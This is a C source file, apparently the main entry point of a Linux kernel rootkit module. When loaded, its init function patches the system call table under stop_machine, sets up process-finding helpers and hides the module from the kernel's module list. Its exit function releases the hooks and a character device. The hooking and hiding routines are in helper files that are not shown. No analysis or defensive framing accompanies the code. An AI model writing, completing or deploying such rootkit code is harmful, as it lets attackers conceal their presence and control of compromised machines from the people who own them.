#include <linux/init.h>
#include <linux/module.h>
#include "fs_helper.h"
#include "hook.h"
#include "syscall_helper.h"
#include "utils.h"

MODULE_LICENSE("GPL");


static int __init rootkit_init(void)
{
    printk(KERN_ALERT "rootkit init\n");
    init_x64_sys_call();
    proc_find_init();
    stop_machine(init_syscall_table, NULL, NULL);
    hide_module();
    utils_init();
    return 0;
}


static void __exit rootkit_exit(void)
{
    hook_release();
    chrdev_release();
    printk(KERN_ALERT "rookit exit\n");
}


module_init(rootkit_init);
module_exit(rootkit_exit);
